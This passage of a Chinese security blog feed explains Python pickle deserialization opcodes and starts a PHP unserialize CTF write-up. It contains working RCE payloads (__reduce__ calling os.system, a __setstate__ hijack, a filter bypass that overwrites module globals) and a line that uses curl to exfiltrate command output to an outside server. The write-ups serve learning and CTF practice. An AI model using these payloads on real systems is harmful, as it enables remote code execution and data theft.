src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405211802380.png" alt loading="lazy"></p><p>栈是反序列化最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，前序栈保存了程序运行至今的（不在顶层的）完整的栈信息。</p><p>存储区可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西。</p><p>下面我们试图来序列化一个类</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport pickletoolsclass dairy():    def __init__(self):        self.date &#x3D; 20202020        self.text &#x3D; &#39;语言&#39;        self.tode &#x3D; [&#39;计&#39;,&#39;算&#39;,&#39;机&#39;]today &#x3D; dairy()print(pickle.dumps(today))x &#x3D; pickle.dumps(today)x &#x3D; pickletools.optimize(x)   #优化，消除未使用的PUTpickletools.dis(x)     #反汇编一个已经打包的字符串，优化一个已经被打包的字符串</code></pre><p><code>pickle</code>构造出的字符串有很多个版本，在<code>pickle.loads</code>时可以用<code>protocol</code>参数指定协议的版本，目前这些协议有0,1,2,3,4号版本，默认使用的是3号版本，pickle协议版本向前兼容，所以不用担心0号版本的字符串交给<code>pickle.loads</code>后会发生什么意外</p><ul><li><strong>v0</strong> 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li><li><strong>v1</strong> 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li><strong>v2</strong> 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。</li><li><strong>v3</strong> 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li><strong>v4</strong> 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。</li></ul><p>以上代码除了将序列化后的字符串反汇编后还用<code>pickletools</code>的<code>optimize</code>方法来将反汇编后的代码进行了优化，优化后输出的结果如下：</p><pre class="language-shell" data-language="shell"><code class="language-shell">b&#39;\x80\x03c__main__\ndairy\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00dateq\x03J$B4\x01X\x04\x00\x00\x00textq\x04X\x06\x00\x00\x00\xe8\xaf\xad\xe8\xa8\x80q\x05X\x04\x00\x00\x00todeq\x06]q\x07(X\x03\x00\x00\x00\xe8\xae\xa1q\x08X\x03\x00\x00\x00\xe7\xae\x97q\tX\x03\x00\x00\x00\xe6\x9c\xbaq\neub.&#39;        0: \x80 PROTO      3    2: c    GLOBAL     &#39;__main__ dairy&#39;   18: )    EMPTY_TUPLE   19: \x81 NEWOBJ   20: &#125;    EMPTY_DICT   21: (    MARK   22: X        BINUNICODE &#39;date&#39;   31: J        BININT     20202020   36: X        BINUNICODE &#39;text&#39;   45: X        BINUNICODE &#39;语言&#39;   56: X        BINUNICODE &#39;tode&#39;   65: ]        EMPTY_LIST   66: (        MARK   67: X            BINUNICODE &#39;计&#39;   75: X            BINUNICODE &#39;算&#39;   83: X            BINUNICODE &#39;机&#39;   91: e            APPENDS    (MARK at 66)   92: u        SETITEMS   (MARK at 21)   93: b    BUILD   94: .    STOPhighest protocol among opcodes &#x3D; 2</code></pre><p>其中因为使用了<code>optimize</code>方法省略了<code>q  BINPUT   x</code>这一行汇编指令，这行指令的意思是把当前栈的栈顶复制一份，放进存储区，</p><p>下面对优化后的代码一行一行的进行解释</p><pre class="language-none"><code class="language-none">0: \x80 PROTO      3</code></pre><p><code>\x80</code>：版本(<code>protocol</code>)2后加入，机器看到这个操作符，立刻再去字符串读取一个字节，得到x03。代表这个是依据3号协议序列化的字符串，随后这个操作结束。</p><pre class="language-none"><code class="language-none">2: c    GLOBAL     &#39;__main__ dairy&#39;</code></pre><p><code>c</code>操作符：连续读取两个字符串<code>module</code>和<code>name</code>，规定以<code>\n</code>为分割给<code>find_class</code>方法，然后把<code>module.name</code>压入栈，现在读取到的是<code>main.dairy</code>，放入栈中，通常用来获取一个模块中的属性</p><pre class="language-none"><code class="language-none">18: )    EMPTY_TUPLE</code></pre><p><code>)</code>操作符：把一个空的<code>tuple</code>压入当前栈</p><pre class="language-none"><code class="language-none">19: \x81 NEWOBJ</code></pre><p><code>\x81</code>操作符：从栈中先弹出一个元素，记为<code>args</code>，再弹出一个元素记为<code>cls</code>，接下来执行<code>cls.new(cls,*args)</code>，然后把得到的东西压入栈，简单来说，从栈中弹出一个参数和一个<code>class</code>，然后利用这个参数实例化<code>class</code>，把得到的实例压入栈 </p><pre class="language-none"><code class="language-none">20: &#125;    EMPTY_DICT</code></pre><p><code>&#125;</code>操作符：把一个空的<code>dict</code>压进栈</p><pre class="language-none"><code class="language-none">21: (    MARK</code></pre><p>MARK操作符：这个操作符干的事称为<code>load_mark</code>，把当前栈这个整体，作为一个<code>list</code>，压进前序栈，把当前栈清空</p><pre class="language-none"><code class="language-none">22: X        BINUNICODE &#39;date&#39;</code></pre><p><code>X</code>操作符：和V操作符一样是读入字符串压入堆栈，后面跟的四个字节代表字符串长度，如：<code>X\x04\x00\x00\x00date</code></p><pre class="language-none"><code class="language-none">31: J        BININT     20202020</code></pre><p>J操作符：和X和V一样，只不过这个是4字节发的int型（个人理解）</p><pre class="language-none"><code class="language-none">65: ]        EMPTY_LIST</code></pre><p><code>]</code>操作符，把一个空的<code>list</code>压进栈</p><pre class="language-none"><code class="language-none">91: e            APPENDS    (MARK at 66)</code></pre><p>MARK结束，通过最上面的（66行）堆栈片扩展堆栈上的列表，简单来说就是形成一个列表（个人理解）</p><pre class="language-none"><code class="language-none">92: u        SETITEMS   (MARK at 21)</code></pre><p>调用<code>pop_mark</code>，把当前栈的内容扔进一个数组<code>arr</code>，然后把当前栈恢复到MARK时的状态，从27行开始区分键值对，两个一组地读<code>arr</code>里面的元素，前者作为key，后者作为value</p><pre class="language-none"><code class="language-none">93: b    BUILD</code></pre><p>把当前栈栈顶存进<code>state</code>，然后弹掉，把当前栈顶记为<code>inst</code>，然后弹掉，利用<code>state</code>这系列的值来更新实例<code>inst</code>，把得到的对象扔到当前栈，如果<code>inst</code>拥有<code>__setstate__</code>方法，则吧<code>state</code>交给<code>__setstate__</code>方法来处理，否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code> 里面。实际上这里就有一个安全漏洞</p><pre class="language-none"><code class="language-none">94: .    STOP</code></pre><p><code>.</code>：STOP指令，当前栈顶元素就是反序列化的最终结果，把他弹出</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a><code>__reduce__</code></h4><p><code>__reduce__</code>的指令码为<code>R</code>，他在反序列化的时候干了这么一件事</p><ul><li>取当前栈的栈顶记为<code>args</code>，然后把它弹掉。</li><li>取当前栈的栈顶记为<code>f</code>，然后把它弹掉。</li><li>以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈。</li></ul><p>class的<code>__reduce__</code>方法在pickle反序列化的时候会被执行（类似php中的<code>__wakeup</code>），其底层的编码方法就是利用了R指令，f要么返回字符串，要么返回一个tuple，后者就可以进行利用，payload如下：</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport pickletoolsimport osclass dairy():    def __init__(self):        self.date &#x3D; 20202020        self.text &#x3D; &#39;语言&#39;        self.tode &#x3D; [&#39;计&#39;,&#39;算&#39;,&#39;机&#39;]    def __reduce__(self):                      #反序列化时执行，底层编码方法使用R指令码，        return (os.system,(&#39;whoami&#39;,))today &#x3D; dairy()#print(pickle.dumps(today))x &#x3D; pickle.dumps(today)x &#x3D; pickletools.optimize(x)  #优化，消除未使用的PUTpickletools.dis(x)           #反汇编一个已经打包的字符串，优化一个已经被打包的字符串</code></pre><p>得到以下结果</p><pre class="language-shell" data-language="shell"><code class="language-shell">b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;    0: \x80 PROTO      3    2: c    GLOBAL     &#39;nt system&#39;   13: X    BINUNICODE &#39;whoami&#39;   24: \x85 TUPLE1   25: R    REDUCE   26: .    STOPhighest protocol among opcodes &#x3D; 2</code></pre><p>随后将序列化的内容反序列化</p><pre class="language-python" data-language="python"><code class="language-python">b &#x3D; b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;hack &#x3D; pickle.loads(b)</code></pre><p>随后就可得到命令执行的结果</p><h4 id="c指令码"><a href="#c指令码" class="headerlink" title="c指令码"></a>c指令码</h4><p>先来看下面一段代码：</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport base64class student():    def __init__(self,name,grade):        self.name &#x3D; name        self.grade &#x3D; grade    def __eq__(self,other):     # 定义内置方法,当判断两个对象的值是否相等时，触发此方法        return type(other) is student and self.name &#x3D;&#x3D; other.name and self.grade &#x3D;&#x3D; other.grade        #is比较地址print(pickle.dumps(student(&#39;czj&#39;,&#39;extrader&#39;)))import bluedef check(data):    if b&#39;R&#39; in data:        return &#39;no reduce!&#39;    x &#x3D; pickle.loads(data)    if(x !&#x3D; student(blue.name,blue.grade)):        return &#39;Not equal &gt;_&lt;&#39;    return &#39;well done!&#39;try:    print(check(base64.b64decode(input())))except:    pass</code></pre><p><code>blue.py</code>中：</p><pre class="language-python" data-language="python"><code class="language-python">name &#x3D; &quot;A&quot;grade &#x3D; &quot;B&quot;</code></pre><p>以上代码过滤了<code>R</code>指令码，<code>check</code>方法中检测到<code>input</code>的<code>date</code>中含有<code>R</code>指令码就直接被返回<code>no reduce!</code>，函数给出了一个输入点，在将<code>input</code>的<code>data</code>参数反序列化后需要其中的name和grade和blue这个module中的name和grade相对应，也就是说我们需要利用序列化后的student类，来令其相等</p><p>这里如果我们知道blue.py中参数的值的话，直接构造<code>name = &quot;A&quot;</code>，<code>grade = &quot;B&quot;</code>的payload即可，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174320049.png" alt loading="lazy"></p><p>但是在我们不知道blue.py的前提下如何绕过呢？这里就要用到我们的c指令码了</p><p>c指令码是专门用来获取一个全局变量的</p><p>先看一下反汇编后输出的效果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174942602.png" alt loading="lazy"></p><p>利用c指令替换掉<code>czj</code>和<code>extrader</code>中两个字符串，将<code>pickle.dumps</code>后的<code>bytes</code>字符串中的<code>X\x03\x00\x00\x00czj</code>替换成<code>cblue\nname\n</code>，<code>X\x08\x00\x00\x00extrader</code>替换成<code>cblue\ngrade\n</code>随后base64编码后观察效果：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406180134773.png" alt loading="lazy"></p><p>可以清楚的看到c指令码替换成功，随后也成功的绕过了比较</p><p>但如果c指令的<code>module</code>被限制了呢？c指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法，然而<code>find_class</code>可以被重写，如果c指令码只允许包含<code>__main__</code>这一个<code>module</code>，又该如何解决？代码如下</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport base64import pickletoolsimport blueimport ioimport sysclass student():    def __init__(self,name,grade):        self.name &#x3D; name        self.grade &#x3D; grade    def __eq__(self,other):             return type(other) is student and self.name &#x3D;&#x3D; other.name and self.grade &#x3D;&#x3D; other.gradeclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module &#x3D;&#x3D; &#39;__main__&#39;:            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))        #通过raise显示地引发异常。一旦执行了raise语句，raise后面的语句将不能执行。def restricted_loads(s):    return RestrictedUnpickler(io.BytesIO(s)).load()def check(data):    try:        if &#39;R&#39; in data:            return &#39;no reduce!&#39;        if type(restricted_loads(eval(data))) is not student:            return &quot;false!&quot;        x &#x3D; pickle.loads(eval(data))        if(x !&#x3D; student(blue.name,blue.grade)):            return &#39;Not equal &gt;_&lt;&#39;        return &#39;well done!&#39;    except:        return &quot;Something wrong&quot;try:    print(check(base64.b64decode(input().encode(&quot;utf8&quot;)).decode(&quot;utf8&quot;)))except:    pass</code></pre><p><code>blue.py</code>中：</p><pre class="language-python" data-language="python"><code class="language-python">name &#x3D; &quot;A&quot;grade &#x3D; &quot;B&quot;</code></pre><p>题目部分来自XCTF高校战疫的一道题：webtmp</p><p>这道题就将input的date的modules进行了判断，如果不是<code>__main__ student</code>则会引发错误然后退出，那该如何解决？</p><p>我们知道，通过GLOBAL引入的变量，可以看作是原变量的引用，<strong>当我们在栈上修改它的值</strong>，会导致原变量也被修改！思路如下：</p><ul><li>通过<code>__main__.blue</code>引入这一个<code>module</code>，由于命名空间还在main内，故不会拦截，也就是说，在<code>__main__</code>上再新构造一个模块，用来对数据进行改写</li><li>把一个<code>dict</code>压进栈，内容是<code>&#123;&#39;name&#39;:&#39;B&#39;,&#39;grade&#39;:&#39;B&#39;&#125;</code></li><li>执行<code>BUILD</code>指令，会改写<code>__main__.blue.name</code>和<code>__main__.blue.grade</code>，到这里<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li><li>弹掉栈顶，现在栈变成空的</li><li>照抄正常的Student序列化之后的字符串，压入一个正常的<code>student</code>对象，<code>name</code>和<code>grade</code>分别是<code>&#39;B&#39;</code>和<code>&#39;B&#39;</code>由于</li></ul><p>由于栈顶是正常的<code>student</code>对象（<code>if</code>语句判断用过），<code>pickle.loads</code>会返回正常，于是到手的<code>student</code>对象<code>name</code>和<code>grade</code>都与<code>blue.name</code>、<code>blue.grade</code>对应了</p><p><code>payload</code>如下：</p><pre class="language-python" data-language="python"><code class="language-python">b&#39;\x80\x03c__main__\nblue\n&#125;(Vname\nVB\nVgrade\nVB\nub0c__main__\nstudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x01\x00\x00\x00BX\x05\x00\x00\x00gradeX\x01\x00\x00\x00Bub.&#39;</code></pre><p>其中q指令可省略</p><p>把过程输出执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406221611185.png" alt loading="lazy"></p><p>可看到成功绕过了判断</p><h4 id="setstate"><a href="#setstate" class="headerlink" title="setstate"></a>setstate</h4><p>如果<code>inst</code>有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理，否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code>里面</p><p><code>__setstate__</code>与<code>__getstate__</code>的关系：<code>pickle</code>一个类的实例时，Python 将只 <code>pickle</code> 当它调用该实例的 <code>getstate()</code> 方法时返回给它的值。类似的，在 <code>unpickle</code> 时，Python 将提供经过 <code>unpickle</code> 的值作为参数传递给实例的 <code>setstate()</code> 方法。</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport pickletoolsclass Foo():  def __init__(self):     self.val &#x3D; 2020  def __getstate__(self):     print(&quot;I&#39;m being pickled&quot;)     self.val *&#x3D; 2     return self.__dict__  def __setstate__(self, d):     print(&quot;I&#39;m being unpickled with these values:&#123;&#125;&quot;.format(d))      self.__dict__ &#x3D; d     self.val *&#x3D; 3f &#x3D; Foo()f_string &#x3D; pickle.dumps(f)print(f_string)a &#x3D; pickletools.optimize(f_string)pickletools.dis(a)f_new &#x3D; pickle.loads(f_string)print(&quot;&#123;&#125;&quot;.format(f_new.val))</code></pre><p>代码执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407095734164.png" alt loading="lazy"></p><p>可看到<code>pickle</code>时执行了<code>__getstate__</code>方法，<code>unpickle</code>时执行了<code>__setstate__</code>方法，且使用了<code>__getstate__</code>方法返回的值</p><p>如果当原对象没有<code>__setstate__</code>这个方法的时候，如果我们构造了一个<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>来<code>BUILD</code>这个对象，就会造成任意代码执行，现在对象的<code>__setstate__</code>就变成了</p><p><code>os.system</code>，接下来再次利用<code>dir</code>来<code>BUILD</code>这个对象，就构成了<code>os.system(&#39;dir&#39;)</code>命令执行，实现了RCE</p><p><code>payload</code>：<code>b&#39;\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.&#39;</code></p><p>有如下代码：</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport pickletoolsclass Foo():  def __init__(self):     self.val &#x3D; 2020  def __getstate__(self):     print(&quot;I&#39;m being pickled&quot;)     self.val *&#x3D; 2     return self.__dict__f &#x3D; Foo()f_string &#x3D; pickle.dumps(f)print(f_string)a &#x3D; pickletools.optimize(f_string)pickletools.dis(a)f_new &#x3D; pickle.loads(f_string)print(&quot;&#123;&#125;&quot;.format(f_new.val))d &#x3D; b&#39;\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.&#39;c &#x3D; pickletools.optimize(d)pickletools.dis(c)pickle.loads(c)</code></pre><p>执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407100434411.png" alt loading="lazy"></p><p>可见成功执行了命令</p><p>完整payload如下：</p><pre class="language-python" data-language="python"><code class="language-python">b&#39;\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb0c__main__\nFoo\nq\x00)\x81q\x01&#125;q\x02X\x03\x00\x00\x00valq\x03K\x04sb.&#39;</code></pre><p>恶意代码执行完后将栈弹空，然后压一个正常的<code>student</code>入栈</p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>其他模块的load也可以触发pickle反序列化漏洞。例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞。</p><p>即使代码中没有<code>import os</code>，GLOBAL指令也可以自动导入<code>os.system</code>。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。</p><p>即使没有回显，也可以很方便地调试恶意代码。只需要拥有一台公网服务器，执行</p><pre class="language-none"><code class="language-none">os.system(&#39;curl your_server&#x2F;&#96;ls &#x2F; | base64&#96;&#39;)</code></pre><p>然后查询您自己的服务器日志，就能看到结果。这是因为：以反引号包含的代码，在sh中会直接执行，返回其结果。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></li><li><a href="https://mp.weixin.qq.com/s/3CLh1V9FZ36-Tw9ikUSsaA">https://mp.weixin.qq.com/s/3CLh1V9FZ36-Tw9ikUSsaA</a></li><li><a href="https://www.cnblogs.com/cioi/p/12464592.html">https://www.cnblogs.com/cioi/p/12464592.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;pickle库&quot;&gt;&lt;a href=&quot;#pickle库&quot; class=&quot;headerlink&quot; title=&quot;pickle库&quot;&gt;&lt;/a&gt;pickle库&lt;/h3&gt;&lt;p&gt;说到python反序列化就当然离不开&lt;code&gt;pickle&lt;/code&gt;库&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405204254190.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;以上例子简单的示范了python进行序列化和反序列化的操作&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="python" scheme="https://www.extrader.top/tags/python/"/>
    
      <category term="反序列化" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CTF-反序列化</title>
    <link href="https://www.extrader.top/posts/d3333ead/"/>
    <id>https://www.extrader.top/posts/d3333ead/</id>
    <published>2020-04-01T16:00:00.000Z</published>
    <updated>2020-04-01T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>php中常用的几种魔术方法和触发条件</p><pre class="language-php" data-language="php"><code class="language-php">__construct ：当一个对象创建时被调用__destruct ：当一个对象销毁时被调用__toString ：当一个类或对象被当作一个字符串被调用__wakeup ：当一个对象使用 unserialize 时触发，反序列化时触发__sleep ：当一个对象使用 serialize 时触发，序列化时触发__get ：当一个对象读取不可访问属性的值时触发__set ：当一个对象在给不可访问属性赋值时__isset ：当一个对象当对不可访问属性调用 isset 或 empty 时触发__unset ：当一个对象对不可访问属性调用 unset 时触发__invoke ：当一个对象尝试以调用函数的方式调用一个对象时触发__set_state ：当一个对象调用 var_export 导出类时，此静态方法会被调用__call ：当一个对象在对象上下文中调用不可访问的方法时触发 __callStatic ：当一个对象在静态上下文中调用不可访问的方法时触发</code></pre><p>不同属性之间的区别</p><pre class="language-php" data-language="php"><code class="language-php">public  变量（公有） 直接将变量名反序列化出来 protected  变量（受保护） \x00 + * + \x00 + 变量名 private  变量（私有） \x00 + 类名 + \x00 + 变量名</code></pre><a id="more"></a><hr><h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><p>感谢xctf平台，题目<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1">链接</a></p><p>题目代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php class Demo &#123;     private $file &#x3D; &#39;index.php&#39;;    public function __construct($file) &#123;         $this-&gt;file &#x3D; $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123;             &#x2F;&#x2F;the secret is in the fl4g.php            $this-&gt;file &#x3D; &#39;index.php&#39;;         &#125;     &#125; &#125;if (isset($_GET[&#39;var&#39;])) &#123;     $var &#x3D; base64_decode($_GET[&#39;var&#39;]);     if (preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $var)) &#123;         die(&#39;stop hacking!&#39;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;</code></pre><p>由代码可知，题目提供了一个<code>var</code>参数给我们进行<code>get</code>传参，首先先对<code>var</code>进行<code>base64</code>解码，然后进入<code>if</code>判断语句，若判断条件不成立就进入<code>else</code>，进行<code>unserialize</code>操作，题目提供了一个<code>Demo</code>类来进行序列化操作，且其中的<code>__destruct</code>方法可以将代码显示出来，题目提示了<code>the secret is in the fl4g.php</code>，flag应该就在<code>fl4g.php</code>中，于是寻找突破点</p><p>题目限制条件：</p><blockquote><p>preg_match(‘/[oc]:\d+:/i’, $var)：对传入的var经过base64解密后的字符串进正则匹配，来防止反序列化操作</p><p><code>__wakeup</code>函数：<code>__wakeup()</code>是用在反序列化操作中。<code>unserialize()</code>会检查存在一个<code>__wakeup()</code>方法。如果存在，则先会调用<code>__wakeup()</code>方法，在这里这个函数会将<code>file</code>赋值为<code>index.php</code></p></blockquote><p>可是这两种方法都可以进行绕过：</p><blockquote><p>preg_match()：这个正则匹配函数是用来防止反序列化的开头的，如<code>O:4:</code>即可匹配上，但可以用+进行绕过，可以写成<code>O:+4:</code>反序列化函数一样识别</p><p><code>__wakeup</code>函数：<code>__wakeup()</code>漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。例如<code>O:4:&quot;Demo&quot;:1:</code>，Demo后面的1表示的就是类的属性个数，将1改大即可跳过<code>__wakeup</code>函数的执行</p></blockquote><p>于是构造payload：<code>O:+4:&quot;Demo&quot;:4:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p><p>注意<code>file</code>前面的<code>Demo</code>左右需要有<code>%00</code></p><pre class="language-php" data-language="php"><code class="language-php">序列化后：v1 表示 public   %00Demo%00v2 表示 private(Demo为类名)   %00*%00v3 表示 protected  v1,v2,v3为属性名</code></pre><p><code>base64</code>编码后<code>TzorNDoiRGVtbyI6NDp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><blockquote><p>参考：<br><a href="https://www.jianshu.com/p/8f498198fc3d">php序列化与反序列化入门</a><br><a href="https://www.cnblogs.com/kacha886/p/9115503.html">魔术方法<code>__sleep()</code>,<code>__wakeup()</code></a><br><a href="http://blog.sina.com.cn/s/blog_15ebf299a0102xnug.html">__wakeup()函数漏洞以及实际漏洞分析</a></p></blockquote><p>PS：php代码审计是个大坑，刚接触的话上手还是有点困难，还是要多看看php代码，需要有面向对象编程的思想，否则代码量大的就比较难入手；序列化算是一个重点了吧，原来就接触过好多这样的题，但都不怎么看得懂，所以就都略过了，现在学了点php基础勉强能够看的懂，总之多看多思考，慢慢来吧。</p><hr><h3 id="极客大挑战-2019—PHP"><a href="#极客大挑战-2019—PHP" class="headerlink" title="极客大挑战-2019—PHP"></a>极客大挑战-2019—PHP</h3><p>界面：<br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200324104326758.png" alt loading="lazy"></p><p>题目提示网站有备份，于是访问<code>www.zip</code>，得到网页源码：</p><p>index.php</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  ......<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">    ......</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>world<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 85%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 440px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 80%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 700px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>不愧是我！！！    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token 